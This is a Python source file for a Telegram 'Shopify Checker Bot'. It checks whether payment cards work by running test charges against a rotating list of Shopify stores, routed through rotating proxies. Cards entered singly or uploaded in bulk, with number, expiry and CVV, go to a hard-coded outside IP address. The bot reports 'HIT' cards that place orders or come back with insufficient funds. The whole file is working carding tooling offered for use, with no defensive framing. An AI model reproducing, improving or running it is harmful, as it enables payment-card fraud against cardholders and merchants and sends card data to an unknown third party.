import os
import telebot
import requests
import urllib.parse
import time
import itertools
from threading import Thread
from flask import Flask

# --- CONFIGURATION ---
API_TOKEN = os.getenv("TELEGRAM_TOKEN")
bot = telebot.TeleBot(API_TOKEN)

# Global lists and iterators
proxies = []
sites = []
proxy_pool = None
site_pool = None

def update_pools():
    global proxy_pool, site_pool
    if proxies:
        proxy_pool = itertools.cycle(proxies)
    if sites:
        site_pool = itertools.cycle(sites)

def load_initial_data():
    global proxies, sites
    try:
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
        if os.path.exists("sites.txt"):
            with open("sites.txt", "r") as f:
                sites = [line.strip() for line in f if line.strip()]
        update_pools()
    except Exception as e:
        print(f"Error loading files: {e}")

load_initial_data()

# --- FLASK SERVER ---
app = Flask('')
@app.route('/')
def home(): return "Bot is running with Help Menu!"

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- NEW: START / HELP COMMAND ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    help_text = (
        "🚀 *Shopify Checker Bot Menu*\n\n"
        "*Core Commands:*\n"
        "• `/cc card|mm|yy|cvv` - Single card check (with 3x retry)\n"
        "• Upload a `.txt` file with caption `/msc` - Mass check cards\n\n"
        "*Proxy Management:*\n"
        "• `/addproxy host:port:user:pass` - Add a new proxy\n"
        "• `/proxy` - See total proxy count and status\n\n"
        "*Site Management:*\n"
        "• `/addsite domain.com` - Add a new Shopify target site\n"
        "• `/sites` - List all currently loaded target sites\n\n"
        "💡 _Note: Rotation and retries are enabled by default._"
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")

# --- OTHER COMMANDS ---

@bot.message_handler(commands=['addproxy'])
def add_proxy(message):
    args = message.text.split()
    if len(args) < 2:
        return bot.reply_to(message, "❌ Usage: `/addproxy host:port:user:pass`", parse_mode="Markdown")
    proxies.append(args[1])
    update_pools()
    bot.reply_to(message, f"✅ Proxy added. Total: {len(proxies)}")

@bot.message_handler(commands=['addsite'])
def add_site(message):
    args = message.text.split()
    if len(args) < 2:
        return bot.reply_to(message, "❌ Usage: `/addsite domain.com`", parse_mode="Markdown")
    sites.append(args[1])
    update_pools()
    bot.reply_to(message, f"✅ Site added. Total: {len(sites)}")

@bot.message_handler(commands=['proxy'])
def list_proxies(message):
    if not proxies: return bot.reply_to(message, "Proxy list empty.")
    bot.reply_to(message, f"🌐 **Total Proxies:** {len(proxies)}\nRotation is active.", parse_mode="Markdown")

@bot.message_handler(commands=['sites'])
def list_sites(message):
    if not sites: return bot.reply_to(message, "Site list empty.")
    site_list = "\n".join([f"• `{s}`" for s in sites])
    bot.reply_to(message, f"🎯 **Current Sites:**\n{site_list}", parse_mode="Markdown")

@bot.message_handler(commands=['cc'])
def single_check(message):
    global proxy_pool, site_pool
    if not proxy_pool or not site_pool:
        return bot.reply_to(message, "❌ Error: Add proxies and sites first.")
    args = message.text.split()
    if len(args) < 2: return bot.reply_to(message, "❌ Usage: `/cc card|mm|yy|cvv`")
    
    card = args[1]
    res = None
    for attempt in range(3):
        res = check_card_api(card, next(site_pool), next(proxy_pool))
        if res: break
        time.sleep(1)
    
    status = res.get('Response', 'Error') if res else 'Failed'
    bot.send_message(message.chat.id, f"💳 `{card}`\nResult: {status}")

@bot.message_handler(content_types=['document'])
def mass_check(message):
    global proxy_pool, site_pool
    if message.caption and "/msc" in message.caption:
        if not proxy_pool or not site_pool:
            return bot.reply_to(message, "❌ Add proxies/sites first.")
        file_info = bot.get_file(message.document.file_id)
        cards = bot.download_file(file_info.file_path).decode("utf-8").splitlines()
        bot.reply_to(message, f"🚀 Checking {len(cards)} cards...")
        for card in cards:
            if not card.strip(): continue
            res = None
            for _ in range(3):
                res = check_card_api(card.strip(), next(site_pool), next(proxy_pool))
                if res: break
            if res and res.get("Response") in ("ORDER_PLACED", "INSUFFICIENT_FUNDS", "OTP_REQUIRED"):
                bot.send_message(message.chat.id, f"✅ HIT: `{card.strip()}` | {res.get('Response')}")
            time.sleep(1.5)

def check_card_api(card, site, proxy):
    BASE_URL = "http://198.105.113.52:8070/check"
    params = {"card": card, "site": site, "proxy": proxy}
    url = f"{BASE_URL}?{urllib.parse.urlencode(params, safe=':')}"
    try:
        resp = requests.get(url, timeout=25)
        return resp.json() if resp.status_code == 200 else None
    except: return None

if __name__ == "__main__":
    Thread(target=run_web_server).start()
    bot.infinity_polling()
    